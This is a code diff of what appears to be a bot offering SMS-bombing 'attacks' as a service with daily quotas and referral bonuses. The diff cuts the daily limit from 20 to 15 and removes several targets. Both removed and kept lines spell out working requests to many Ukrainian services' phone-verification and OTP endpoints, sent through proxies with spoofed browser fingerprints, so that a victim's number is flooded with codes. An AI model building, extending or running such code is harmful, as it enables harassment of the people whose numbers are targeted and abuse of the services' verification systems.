@@ -146,7 +146,7 @@ async def init_db():
                 name TEXT,
                 username TEXT,
                 block INTEGER DEFAULT 0,
-                attacks_left INTEGER DEFAULT 20,
+                attacks_left INTEGER DEFAULT 15,
                 promo_attacks INTEGER DEFAULT 0,
                 referral_attacks INTEGER DEFAULT 0,
                 unused_referral_attacks INTEGER DEFAULT 0,
@@ -702,7 +702,7 @@ async def add_user(user_id: int, name: str, username: str, referrer_id: int = No
     async with db_pool.acquire() as conn:
         await conn.execute(
             'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
-            user_id, name, username, 0, 20, 0, 0, 0, today, referrer_id
+            user_id, name, username, 0, 15, 0, 0, 0, today, referrer_id
         )
         
         if referrer_id:
@@ -1020,14 +1020,6 @@ async def admin_check_services(message: Message):
         ("GoodWine", "https://goodwine.com.ua/ua/auth/code/send", {"json": {"username": "+" + test_number}, "headers": headers_goodwine}, None),
         ("Brabrabra", "https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", {"data": {"sessid": brabrabra_sessid or "", "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabrabra, "cookies": cookies_brabrabra}, None),
         ("Finbert", "https://finbert.ua/auth/register/", {"data": {"csrfmiddlewaretoken": finbert_csrf_token or "", "phone": "+" + test_number, "cf-turnstile-response": ""}, "headers": headers_finbert, "cookies": cookies_finbert}, None),
-        ("Work.ua", "https://www.work.ua/api/v3/jobseeker/auth/", {"json": {"login": formatted_number}, "headers": headers_workua, "cookies": cookies_workua}, None),
-        ("Binance", "https://accounts.binance.com/bapi/accounts/v1/public/account/security/request/precheck", {"json": {"bizType": "login", "callingCode": "380", "mobile": test_number[3:], "mobileCode": "UA"}, "headers": headers_binance, "cookies": cookies_binance}, None),
-        ("TrafficGuard", "https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", {"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard}, None),
-        ("Oschadbank", f"https://c2c.oschadbank.ua/api/sms/{test_number}", {"method": 'GET', "headers": headers}, None),
-        ("Prosto", f"https://api.prosto.net/v2/verify?type=intl_phone&value={test_number}", {"method": 'GET', "headers": headers}, None),
-        ("LA.ua", "https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", {"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number9, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la}, None),
-        # Ta-Da Call (телефонує) - закоментовано
-        # ("Ta-Da Call", "https://api.ta-da.net.ua/v1.1/mobile/auth.call", {"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"}, None),
     ]
     
     async def check_service_status(name, url_or_type, request_params, custom_headers):
@@ -2185,14 +2177,6 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None, proxy_entry=None
             bounded_request("https://goodwine.com.ua/ua/auth/code/send", **with_proxy({"json": {"username": "+" + number}, "headers": headers_goodwine})),
             bounded_request("https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", **with_proxy({"data": {"sessid": brabrabra_sessid or "", "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabrabra, "cookies": cookies_brabrabra})),
             bounded_request("https://finbert.ua/auth/register/", **with_proxy({"data": {"csrfmiddlewaretoken": finbert_csrf_token or "", "phone": "+" + number, "cf-turnstile-response": ""}, "headers": headers_finbert, "cookies": cookies_finbert})),
-            bounded_request("https://www.work.ua/api/v3/jobseeker/auth/", **with_proxy({"json": {"login": formatted_number}, "headers": headers_workua, "cookies": cookies_workua})),
-            bounded_request("https://accounts.binance.com/bapi/accounts/v1/public/account/security/request/precheck", **with_proxy({"json": {"bizType": "login", "callingCode": "380", "mobile": number[3:], "mobileCode": "UA"}, "headers": headers_binance, "cookies": cookies_binance})),
-            bounded_request("https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", **with_proxy({"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™: офіційний сайт онлайн-гіпермаркету Розетка в Україні", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard})),
-            bounded_request(f"https://c2c.oschadbank.ua/api/sms/{number}", **with_proxy({"method": 'GET', "headers": headers})),
-            bounded_request(f"https://api.prosto.net/v2/verify?type=intl_phone&value={number}", **with_proxy({"method": 'GET', "headers": headers})),
-            bounded_request("https://la.ua/vinnytsya/wp-admin/admin-ajax.php?lang=uk", **with_proxy({"data": {"action": "user_login", "formData": f"tel={urllib.parse.quote(formatted_number_la, safe='')}&code=", "nonce": "1d8ce3c7e4"}, "headers": headers_la})),
-            # Ta-Da Call (телефонує) - закоментовано
-            # bounded_request("https://api.ta-da.net.ua/v1.1/mobile/auth.call", **with_proxy({"json": {"phone": formatted_number9}, "headers": headers_ta_da, "method": "PUT"})),
         ]
 
     if not attack_flags.get(chat_id):
@@ -2476,7 +2460,7 @@ async def reset_daily_attacks():
             updated_count = await conn.execute(
                 """
                 UPDATE users 
-                SET attacks_left = 20, 
+                SET attacks_left = 15, 
                     referral_attacks = 0, 
                     unused_referral_attacks = 0, 
                     last_attack_date = $1
@@ -2590,8 +2574,8 @@ async def check_attack_limits(user_id: int):
         # Перевіряємо, чи потрібно скинути атаки на новий день
         if last_attack_date_only != today:
             # Реферальні атаки скидаються (вони дійсні тільки на один день)
-            # Скидаємо звичайні атаки на 20 (максимум на день)
-            new_attacks = 20
+            # Скидаємо звичайні атаки на 15 (максимум на день)
+            new_attacks = 15
             kyiv_now = get_kyiv_datetime()
             await conn.execute(
                 "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
@@ -2601,9 +2585,9 @@ async def check_attack_limits(user_id: int):
             referral_attacks = 0
             unused_referral_attacks = 0
         elif attacks_left is None or attacks_left < 0:
-            # Якщо значення NULL або негативне - встановлюємо 20
+            # Якщо значення NULL або негативне - встановлюємо 15
             # Це виправляє ситуації, коли в базі було некоректне значення
-            new_attacks = 20
+            new_attacks = 15
             await conn.execute(
                 "UPDATE users SET attacks_left = $1 WHERE user_id = $2",
                 new_attacks, user_id
